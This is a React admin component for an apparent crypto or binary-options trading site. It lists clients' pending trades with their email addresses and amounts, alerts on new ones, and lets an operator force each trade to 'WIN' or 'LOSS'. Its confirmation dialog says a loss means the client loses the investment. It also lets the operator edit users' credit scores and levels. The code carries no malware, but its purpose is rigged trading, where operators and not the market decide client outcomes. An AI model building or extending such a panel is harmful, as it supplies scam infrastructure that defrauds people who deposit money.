"use client";

import { useEffect, useState, useCallback, useRef } from "react";
import { useAuth } from "@/contexts/AuthContext";
import { formatCurrency } from "@/lib/utils";
import { Clock, CheckCircle, XCircle, RefreshCcw, UserCog, Trophy, TrendingUp, TrendingDown, Bell } from "lucide-react";
import StockChart from "./StockChart";
import { StockHistory } from "@/lib/types";

interface TradeSession {
    id: string;
    user_id: string;
    symbol: string;
    amount: number;
    duration: number;
    start_time: string;
    status: "PENDING" | "WON" | "LOST";
    trade_type?: "call" | "put";
    users: {
        email: string;
    };
}

export default function AdminTradeControl() {
    const { session } = useAuth();
    const [sessions, setSessions] = useState<TradeSession[]>([]);
    const [loading, setLoading] = useState(false);
    const [confirmAction, setConfirmAction] = useState<{ sessionId: string, action: 'WIN' | 'LOSS' } | null>(null);
    const [previousSessionCount, setPreviousSessionCount] = useState(0);
    const [newTradeAlert, setNewTradeAlert] = useState(false);

    // Chart State
    const [chartSymbol, setChartSymbol] = useState("BTC");
    const [stockHistory, setStockHistory] = useState<StockHistory | null>(null);

    // States for User Stats Edit
    const [targetUserId, setTargetUserId] = useState("");
    const [newScore, setNewScore] = useState(100);
    const [newLevel, setNewLevel] = useState(1);
    const [updateMsg, setUpdateMsg] = useState("");

    // Track if it's the first load
    const isFirstLoad = useRef(true);

    const fetchSessions = useCallback(async () => {
        if (!session) return;
        // Don't set loading on every poll to avoid UI flicker
        // setLoading(true); 
        try {
            const res = await fetch("/api/admin/trade/session", {
                headers: { Authorization: `Bearer ${session.access_token}` },
            });
            if (res.ok) {
                const data = await res.json();

                // Check for new trades (more sessions than before)
                // Trigger sound if we have previous sessions to compare OR if it's the first load and we see pending session
                // Actually, let's just trigger if count increases
                if (data.length > previousSessionCount && previousSessionCount >= 0) {
                    setNewTradeAlert(true);
                    // Play notification sound if explicit new trades came in
                    if (!isFirstLoad.current || data.length > 0) {
                        try {
                            const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZURE');
                            audio.volume = 0.5;
                            audio.play().catch(() => { });
                        } catch (e) { }

                        // Force notification dropdown to refresh immediately
                        window.dispatchEvent(new Event('notificationsUpdated'));
                    }

                    // Clear alert after 5 seconds
                    setTimeout(() => setNewTradeAlert(false), 5000);
                }

                setPreviousSessionCount(data.length);
                setSessions(data);

                isFirstLoad.current = false;

                // Pre-fill user ID if sessions exist
                if (data.length > 0 && !targetUserId) {
                    setTargetUserId(data[0].user_id);
                    // Also auto-select the symbol of the first trade to show in chart
                    setChartSymbol(data[0].symbol.replace(/\/USDT?/, ""));
                }
            }
        } catch (error) {
            console.error("Failed to fetch sessions", error);
        }
    }, [session, previousSessionCount, targetUserId]);

    // Fetch Chart Data when symbol changes
    useEffect(() => {
        const fetchHistory = async () => {
            try {
                // Fetch for the specific stock
                // We use the public stocks.json generally found via the main api or specialized
                // Re-using the logic from /stock/[symbol]

                // For now, let's look at how the app fetches stock data.
                // It seems to rely on /api/stocks which returns ALL. 
                // Or maybe we can fetch specific?

                const res = await fetch(`/api/stocks`);
                if (res.ok) {
                    const allStocks = await res.json();
                    const stock = allStocks.find((s: any) => s.symbol === chartSymbol);
                    if (stock && stock.history) {
                        setStockHistory(stock.history);
                    }
                }
            } catch (e) {
                console.error("Chart data fetch failed", e);
            }
        };

        if (chartSymbol) fetchHistory();
    }, [chartSymbol]);

    useEffect(() => {
        fetchSessions();
        const interval = setInterval(fetchSessions, 3000); // Auto refresh every 3 seconds
        return () => clearInterval(interval);
    }, [fetchSessions]);

    const handleOutcome = async (sessionId: string, action: "WIN" | "LOSS") => {
        if (!session) return;

        // Close confirmation dialog
        setConfirmAction(null);

        try {
            const res = await fetch("/api/admin/trade/session", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${session.access_token}`
                },
                body: JSON.stringify({ sessionId, action }),
            });

            if (res.ok) {
                fetchSessions(); // Refresh list immediately
            }
        } catch (error) {
            console.error("Failed to update outcome", error);
        }
    };

    const handleUpdateStats = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!session || !targetUserId) return;
        setUpdateMsg("Updating...");

        try {
            const res = await fetch("/api/admin/users/update", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${session.access_token}`
                },
                body: JSON.stringify({
                    targetUserId,
                    creditScore: newScore,
                    level: newLevel
                }),
            });

            if (res.ok) {
                setUpdateMsg("Success!");
                setTimeout(() => setUpdateMsg(""), 3000);
            } else {
                setUpdateMsg("Failed");
            }
        } catch (error) {
            setUpdateMsg("Error");
        }
    };

    return (
        <div className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {/* ACTIVE TRADES */}
                <div className="bg-dark-card border border-dark-border rounded-xl p-6 shadow-xl">
                    <div className="flex items-center justify-between mb-6">
                        <h2 className="text-xl font-bold text-white flex items-center gap-2">
                            <Clock className="w-6 h-6 text-purple-400" />
                            Active Trades
                        </h2>
                        <button
                            onClick={fetchSessions}
                            disabled={loading}
                            className="p-2 rounded-lg bg-dark-hover text-blue-accent hover:text-white transition-colors"
                        >
                            <RefreshCcw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
                        </button>
                    </div>

                    {sessions.length === 0 ? (
                        <div className="text-center py-8 text-gray-500">
                            No active trade sessions found.
                        </div>
                    ) : (
                        <div className="space-y-4 max-h-[400px] overflow-y-auto pr-2 scrollbar-thin">
                            {sessions.map((item) => (
                                <div key={item.id} className="bg-dark-hover rounded-lg p-4 border border-dark-border flex flex-col gap-3">
                                    <div className="flex justify-between items-start">
                                        <div>
                                            <div
                                                className="flex items-center gap-2 mb-1 cursor-pointer hover:text-emerald-400 transition-colors"
                                                onClick={() => setChartSymbol(item.symbol.replace(/\/USDT?/, ""))}
                                            >
                                                <span className="font-bold text-white text-lg">{item.symbol}</span>
                                                <TrendingUp className="w-4 h-4 text-emerald-500" />

                                                {/* Direction Badge */}
                                                {item.trade_type && (
                                                    <span className={`flex items-center gap-1 text-[10px] px-1.5 py-0.5 rounded font-bold ml-2 ${item.trade_type === 'call'
                                                        ? 'bg-green-500/20 text-green-400 border border-green-500/30'
                                                        : 'bg-red-500/20 text-red-400 border border-red-500/30'
                                                        }`}>
                                                        {item.trade_type === 'call' ? <TrendingUp className="w-3 h-3" /> : <TrendingDown className="w-3 h-3" />}
                                                        {item.trade_type.toUpperCase()}
                                                    </span>
                                                )}
                                            </div>
                                            <div className="text-xs text-gray-400">
                                                User: <span className="text-blue-300" onClick={() => setTargetUserId(item.user_id)}>{item.users?.email}</span>
                                            </div>
                                        </div>
                                        <div className="text-right">
                                            <div className="text-green-400 font-bold">{formatCurrency(item.amount)}</div>
                                            <span className="text-xs px-2 py-0.5 rounded bg-purple-500/10 text-purple-300 border border-purple-500/20">
                                                {item.duration}s
                                            </span>
                                        </div>
                                    </div>

                                    <div className="grid grid-cols-2 gap-2">
                                        <button
                                            onClick={() => setConfirmAction({ sessionId: item.id, action: 'WIN' })}
                                            className="px-3 py-1.5 bg-green-500/10 hover:bg-green-500/20 border border-green-500/30 text-green-400 rounded-md text-sm font-medium transition-all hover:scale-105"
                                        >
                                            <CheckCircle className="w-4 h-4 inline mr-1" />
                                            Win
                                        </button>
                                        <button
                                            onClick={() => setConfirmAction({ sessionId: item.id, action: 'LOSS' })}
                                            className="px-3 py-1.5 bg-red-500/10 hover:bg-red-500/20 border border-red-500/30 text-red-400 rounded-md text-sm font-medium transition-all hover:scale-105"
                                        >
                                            <XCircle className="w-4 h-4 inline mr-1" />
                                            Loss
                                        </button>
                                    </div>
                                </div>
                            ))}
                        </div>
                    )}
                </div>

                {/* LIVE MARKET CHART */}
                <div className="bg-dark-card border border-dark-border rounded-xl p-6 shadow-xl flex flex-col">
                    <div className="flex items-center justify-between mb-4">
                        <h2 className="text-xl font-bold text-white flex items-center gap-2">
                            <TrendingUp className="w-6 h-6 text-emerald-400" />
                            Live Market: <span className="text-emerald-400">{chartSymbol}</span>
                        </h2>
                        <div className="text-xs text-gray-500">
                            Monitoring Mode
                        </div>
                    </div>
                    <div className="flex-1 min-h-[300px]">
                        {stockHistory ? (
                            <StockChart history={stockHistory} />
                        ) : (
                            <div className="h-full flex items-center justify-center text-gray-500">
                                Loading {chartSymbol} data...
                            </div>
                        )}
                    </div>
                </div>
            </div>

            {/* USER STATS CONTROL */}
            <div className="w-full bg-dark-card border border-dark-border rounded-xl p-6 shadow-xl">
                <div className="flex items-center gap-2 mb-6">
                    <UserCog className="w-6 h-6 text-yellow-500" />
                    <h2 className="text-xl font-bold text-white">Manage User Stats</h2>
                </div>

                <form onSubmit={handleUpdateStats} className="grid grid-cols-1 md:grid-cols-4 gap-4 items-end">
                    <div className="md:col-span-2">
                        <label className="block text-sm text-gray-400 mb-1">Target User ID</label>
                        <input
                            type="text"
                            value={targetUserId}
                            onChange={(e) => setTargetUserId(e.target.value)}
                            placeholder="UUID..."
                            className="w-full px-4 py-2 bg-dark-hover border border-dark-border rounded-lg text-white"
                        />
                    </div>

                    <div>
                        <label className="block text-sm text-gray-400 mb-1">Credit Score</label>
                        <input
                            type="number"
                            value={newScore}
                            onChange={(e) => setNewScore(parseInt(e.target.value))}
                            min="0" max="100"
                            className="w-full px-4 py-2 bg-dark-hover border border-dark-border rounded-lg text-white"
                        />
                    </div>

                    <div>
                        <label className="block text-sm text-gray-400 mb-1">Level</label>
                        <input
                            type="number"
                            value={newLevel}
                            onChange={(e) => setNewLevel(parseInt(e.target.value))}
                            min="1" max="10"
                            className="w-full px-4 py-2 bg-dark-hover border border-dark-border rounded-lg text-white"
                        />
                    </div>

                    <div className="md:col-span-4 flex justify-end items-center gap-3">
                        {updateMsg && <span className={updateMsg === "Success!" ? "text-green-500" : "text-yellow-500"}>{updateMsg}</span>}
                        <button
                            type="submit"
                            disabled={!targetUserId}
                            className="px-6 py-2 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-lg transition-colors disabled:opacity-50"
                        >
                            Update Stats
                        </button>
                    </div>
                </form>
            </div>

            {/* Confirmation Dialog */}
            {confirmAction && (
                <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
                    <div className="bg-dark-card border border-dark-border rounded-xl p-6 max-w-md w-full shadow-2xl">
                        <h3 className="text-xl font-bold text-white mb-4">
                            Confirm Trade Outcome
                        </h3>
                        <p className="text-gray-300 mb-6">
                            Are you sure you want to force this trade to <span className={confirmAction.action === 'WIN' ? 'text-green-400 font-bold' : 'text-red-400 font-bold'}>{confirmAction.action}</span>?
                            {confirmAction.action === 'WIN' && ' The client will receive their investment plus 80% profit.'}
                            {confirmAction.action === 'LOSS' && ' The client will lose their investment.'}
                        </p>
                        <div className="flex gap-3">
                            <button
                                onClick={() => setConfirmAction(null)}
                                className="flex-1 px-4 py-2 bg-dark-hover border border-dark-border text-white rounded-lg font-medium hover:bg-dark-bg transition-all"
                            >
                                Cancel
                            </button>
                            <button
                                onClick={() => handleOutcome(confirmAction.sessionId, confirmAction.action)}
                                className={`flex-1 px-4 py-2 rounded-lg font-medium transition-all ${confirmAction.action === 'WIN'
                                    ? 'bg-green-500 hover:bg-green-600 text-white'
                                    : 'bg-red-500 hover:bg-red-600 text-white'
                                    }`}
                            >
                                Confirm {confirmAction.action}
                            </button>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
